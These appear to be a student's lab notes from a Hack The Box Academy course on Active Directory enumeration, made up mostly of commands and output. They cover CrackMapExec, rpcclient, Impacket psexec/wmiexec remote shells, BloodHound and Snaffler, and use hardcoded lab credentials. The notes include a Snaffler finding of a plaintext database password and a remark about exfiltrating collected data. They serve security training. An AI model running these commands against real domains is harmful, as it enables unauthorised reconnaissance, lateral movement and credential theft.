# Credentialed Enumeration - from Linux

## CrackMapExec

Domain User Enumeration :
sudo crackmapexec smb $TARGET -u forend -p Klmcargo2 --users

Domain Group Enumeration :
sudo crackmapexec smb $TARGET -u forend -p Klmcargo2 --groups

Logged On Users :
sudo crackmapexec smb $TARGET -u forend -p Klmcargo2 --loggedon-users
SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\clusteragent              logon_server: ACADEMY-EA-DC01
SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\lab_adm                   logon_server: ACADEMY-EA-DC01
SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\svc_qualys                logon_server: ACADEMY-EA-DC01
SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\wley                      logon_server: ACADEMY-EA-DC01

Share Enumeration - Domain Controller :
sudo crackmapexec smb $TARGET -u forend -p Klmcargo2 --shares

Spider_plus :
sudo crackmapexec smb $TARGET -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
head -n 10 /tmp/cme_spider_plus/$TARGET.json

## SMBMap

SMBMap To Check Access :
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H $TARGET

Recursive List Of All Directories :
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H $TARGET -R 'Department Shares'

## rpcclient

rpcclient -U "" -N $TARGET
--> Users enumeration
rpcclient $> enumdomusers
rpcclient $> queryuser <RID>
rpcclient $> querygroup <group_rid>

## Impacket Toolkit

To connect to a host with psexec.py :
psexec.py inlanefreight.local/wley:'transporter@4'@$TARGET  

Wmiexec.py utilizes a semi-interactive shell where commands are executed through WMI :
wmiexec.py inlanefreight.local/wley:'transporter@4'@$TARGET  
-> each command issued will execute a new cmd.exe from WMI

## Windapsearch

Windapsearch - Domain Admins :
python3 windapsearch.py --dc-ip $TARGET -u forend@inlanefreight.local -p Klmcargo2 --da

Windapsearch - Privileged Users :
python3 windapsearch.py --dc-ip $TARGET -u forend@inlanefreight.local -p Klmcargo2 -PU

## Bloodhound.py

Once we have domain credentials, we can run the BloodHound.py 

-> Graphical visualization of attack paths due to misconfigurations (approval relationships)

bloodhound-python -h

sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns $TARGET -d inlanefreight.local -c all

ls
20220307163102_computers.json  20220307163102_domains.json  20220307163102_groups.json  20220307163102_users.json  

Viewing the Results :

1) zip all json files
zip -r ilfreight_bh.zip *.json
2) start neo4j
sudo neo4j start
type : bloodhound
3) Authenticate on bloodhound
bloodhound
user == neo4j / pass == HTB_@cademy_stdnt!

# Credentialed Enumeration - from Windows

## ActiveDirectory PowerShell Module

Discover Modules :
PS C:\htb> Get-Module

Load ActiveDirectory Module :
Import-Module ActiveDirectory
Get-Module

Get Domain Info :
Get-ADDomain

Get-ADUser :
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

Checking For Trust Relationships :
Get-ADTrust -Filter *

Group Enumeration :
Get-ADGroup -Filter * | select name

name
----
Administrators
Users
Guests
Print Operators
Backup Operators

Detailed Group Info :
Get-ADGroup -Identity "Backup Operators"

Group Membership :
Get-ADGroupMember -Identity "Backup Operators"

## PowerView

Domain User Information :
Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol

Recursive Group Membership :
Get-DomainGroupMember -Identity "Domain Admins" -Recurse

Trust Enumeration :
Get-DomainTrustMapping

Testing for Local Admin Access :
Test-AdminAccess -ComputerName ACADEMY-EA-MS01

ComputerName    IsAdmin
------------    -------
ACADEMY-EA-MS01    True 

Finding Users With SPN Set :
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName

## SharpView

.\SharpView.exe Get-DomainUser -Help

Enumerate information about a specific user :
.\SharpView.exe Get-DomainUser -Identity forend

## Shares

### Snaffler

.\Snaffler.exe  -d INLANEFREIGHT.LOCAL -s -v data

-> may find passwords, SSH keys, configuration files, or other data

## BloodHound

SharpHound in Action :
.\SharpHound.exe --help
.\SharpHound.exe -c All --zipfilename ILFREIGHT

-> exfiltrate the dataset to our own VM or ingest it into the BloodHound GUI tool on MS01

Run queries :
Find Computers where Domain Users are Local Admin

-> custom Cypher queries

2) start neo4j
sudo neo4j start
3) Authenticate on bloodhound
bloodhound
user == neo4j / pass == HTB_@cademy_stdnt!

## LAB LINUX 

rpcclient -U "" -N 172.16.5.5
enumdomusers
queryuser 1170
mmorgan

sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups

SMB         172.16.5.5      445    ACADEMY-EA-DC01  Interns                                  membercount: 10


## LAB WINDOWS

xfreerdp /u:htb-student /p:"Academy_student_AD!" /v:$TARGET

cd c:\tools
.\SharpHound.exe --help
.\SharpHound.exe -c All --zipfilename ILFREIGHT

20231130150945_ILFREIGHT.zip

bloodhound
bolt://localhost:7474
neo4j
HTB_@cademy_stdnt!

Upload Data
20231130150945_ILFREIGHT.zip
X

domain:
INLANEFREIGHT.LOCAL
Analysis > List all Kerberoastable Accounts

PS C:\tools> .\Snaffler.exe  -d INLANEFREIGHT.LOCAL -s -v data
 .::::::.:::.    :::.  :::.    .-:::::'.-:::::':::    .,:::::: :::::::..
;;;`    ``;;;;,  `;;;  ;;`;;   ;;;'''' ;;;'''' ;;;    ;;;;'''' ;;;;``;;;;
'[==/[[[[, [[[[[. '[[ ,[[ '[[, [[[,,== [[[,,== [[[     [[cccc   [[[,/[[['
  '''    $ $$$ 'Y$c$$c$$$cc$$$c`$$$'`` `$$$'`` $$'     $$""   $$$$$$c
 88b    dP 888    Y88 888   888,888     888   o88oo,.__888oo,__ 888b '88bo,
  'YMmMY'  MMM     YM YMM   ''` 'MM,    'MM,  ''''YUMMM''''YUMMMMMMM   'W'
                         by l0ss and Sh3r4 - github.com/SnaffCon/Snaffler


2023-11-30 10:36:10 -08:00 [Share] {Black}(\\ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL\ADMIN$)
2023-11-30 10:36:10 -08:00 [Share] {Black}(\\ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL\C$)
2023-11-30 10:36:10 -08:00 [Share] {Green}(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares)
2023-11-30 10:36:10 -08:00 [Share] {Green}(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\User Shares)
2023-11-30 10:36:10 -08:00 [Share] {Green}(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\ZZZ_archive)
2023-11-30 10:36:38 -08:00 [File] {Red}<KeepExtExactRed|RW|^\.sqldump$|310B|3/31/2022 12:05:02 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\AddPublish.sqldump) .sqldump
2023-11-30 10:36:38 -08:00 [File] {Red}<KeepExtExactRed|RW|^\.sqldump$|312B|3/31/2022 12:05:30 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\DenyRedo.sqldump) .sqldump
2023-11-30 10:36:38 -08:00 [File] {Black}<KeepExtExactBlack|RW|^\.tblk$|280B|3/31/2022 12:05:17 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\ExportJoin.tblk) .tblk
2023-11-30 10:36:38 -08:00 [File] {Black}<KeepExtExactBlack|RW|^\.tblk$|279B|3/31/2022 12:05:25 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\FindConnect.tblk) .tblk
2023-11-30 10:36:38 -08:00 [File] {Red}<KeepExtExactRed|RW|^\.mdf$|305B|3/31/2022 12:09:27 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\FormatShow.mdf) .mdf
2023-11-30 10:36:38 -08:00 [File] {Black}<KeepExtExactBlack|RW|^\.psafe3$|301B|3/31/2022 12:09:33 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\GetUpdate.psafe3) .psafe3
2023-11-30 10:36:38 -08:00 [File] {Red}<KeepExtExactRed|RW|^\.mdf$|299B|3/31/2022 12:09:14 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\LockConfirm.mdf) .mdf
2023-11-30 10:36:38 -08:00 [File] {Black}<KeepExtExactBlack|RW|^\.psafe3$|275B|3/31/2022 12:08:50 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\RedoPop.psafe3) .psafe3
2023-11-30 10:36:38 -08:00 [File] {Black}<KeepExtExactBlack|RW|^\.cscfg$|309B|3/31/2022 12:04:57 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\RequestUnprotect.cscfg) .cscfg
2023-11-30 10:36:38 -08:00 [File] {Red}<KeepExtExactRed|RW|^\.sqldump$|318B|3/31/2022 12:09:01 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\ResolveExpand.sqldump) .sqldump
2023-11-30 10:36:38 -08:00 [File] {Red}<KeepExtExactRed|RW|^\.sqldump$|302B|3/31/2022 12:08:58 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\RestoreCopy.sqldump) .sqldump
2023-11-30 10:36:39 -08:00 [File] {Black}<KeepExtExactBlack|RW|^\.tblk$|301B|3/31/2022 12:05:15 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\SubmitConvertFrom.tblk) .tblk
2023-11-30 10:36:39 -08:00 [File] {Red}<KeepConfigRegexRed|RW|connectionstring[[:space:]]*=[[:space:]]*[\'\"][^\'\"].....*|253B|3/31/2022 12:12:43 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\web.config) <?xml version="1.0" encoding="utf-8"?>
<configuration>
  <connectionStrings>
    <add name="myConnectionString" connectionString="server=ACADEMY-EA-DB01;database=Employees;uid=sa;password=ILFREIGHTDB01!;" />
  </connectionStrings>

sudo neo4j start
Starting Neo4j.
Started neo4j (pid:2694). It is available at http://localhost:7474

bloodhound
http://localhost:7474
neo4j
HTB_@cademy_stdnt!


172.16.5.5
sudo bloodhound-python -u 'htb-student' -p 'Academy_student_AD!' -ns $TARGET -d inlanefreight.local -c all
